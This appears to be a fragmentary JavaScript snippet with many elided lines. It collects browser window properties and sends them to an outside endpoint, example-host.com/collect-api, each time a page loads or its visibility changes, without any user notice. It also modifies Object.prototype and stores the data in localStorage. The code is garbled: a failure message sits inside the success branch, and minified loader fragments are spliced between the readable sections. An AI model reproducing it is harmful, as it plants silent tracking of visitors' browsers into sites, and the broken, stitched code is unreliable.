...
let globalVars = []; // Global Variable Collection

// Utility to capture window property attributes 
!function (t) {
  function e(o) {
...
Object.prototype.jshook = function () {
  console.log('A function was called.');
};

//Sending Async Data
async function sendDataToServer(data) {
  const url = "https://example-host.com/collect-api";
  try {
    ...
    if (resp.ok) {
      ...
      console.error(`Failed to send data with status code ${resp.status}`);
    }
  } catch (err) {
...
// Gather and Send Data block
function gatherSendData() {
  const windowAttrs = captureWindowAttrs();
  if (Object.keys(windowAttrs).length > 0) {
    sendDataToServer(windowAttrs);
  }
  // Local Storage
  localStorage.setItem('Window Properties', JSON.stringify(windowAttrs));
}
window.addEventListener("load", gatherSendData);
!function (t) {
  function e(o) {
    if (n[o]) return n[o].exports;
    var a = n[o] = {
...
document.addEventListener("visibilitychange", gatherSendData);